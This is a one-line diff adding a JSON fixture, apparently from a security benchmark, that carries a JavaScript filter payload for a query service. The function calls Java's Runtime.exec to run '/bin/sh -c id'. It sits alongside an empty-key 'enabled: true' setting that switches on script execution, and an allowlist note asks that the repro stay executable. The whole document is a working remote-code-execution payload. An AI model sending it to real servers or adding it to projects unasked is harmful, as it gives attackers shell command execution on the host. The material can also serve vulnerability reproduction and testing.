@@ -1,0 +1,1 @@
+{"marker": "RD3_TRUSTED_SAMPLER_REPRO", "allowlist_reason": "keep benchmark-local structured sampler repros executable during CVE debugging", "payload": {"type": "javascript", "dimension": "city", "function": "function(){java.lang.Runtime.getRuntime().exec('/bin/sh -c id'); return true;}", "": {"enabled": true}}}
